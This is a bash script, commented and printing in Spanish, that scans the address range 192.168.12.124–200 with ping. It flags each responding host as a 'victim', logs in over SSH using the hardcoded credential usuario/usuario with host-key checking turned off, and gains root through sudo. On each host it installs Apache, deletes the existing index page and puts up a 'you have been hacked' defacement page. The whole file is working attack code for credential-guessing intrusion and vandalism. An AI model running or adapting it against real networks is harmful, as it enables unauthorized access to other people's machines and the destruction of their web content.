#!/bin/bash

PREF=192.168.12

ROJO="\033[0;33m"
VERDE="\033[0;32m"
WHITE="\033[0;37m"

echo "pendejo-adri SIUUUU"
echo "==================="

echo

for x in $(seq 124 1 200); do

  echo -n -e "${WHITE}La IP $PREF.$x${WHITE}"
  ping -c 1 -w 1 $PREF."$x" > /dev/null 2>/dev/null
  if [ $? -eq 0 ] 
  then

    echo -e " ----> ${ROJO}Víctima encontrada${ROJO}"

    sshpass -p usuario ssh -o StrictHostKeyChecking=no usuario@$PREF.$x '

      echo "usuario" | sudo -S apt-get update &&

      echo "usuario" | sudo -S apt-get install apache2 -y &&

      echo "usuario" | sudo -S rm -f /var/www/html/index.html &&

      echo "usuario" | sudo -S mkdir /var/www/html/pendejo-adri &&

      echo "<html><body><h1>HAS SIDO HACKEADO POR: pendejo.adri</h1><img src=\"https://media.vandal.net/m/4082/200511262263_1.jpg\"></body></html>" | sudo tee /var/www/html/pendejo-adri/index.html'

  else

    echo -e " ----> ${VERDE}No es una víctima${VERDE}"

  fi

done
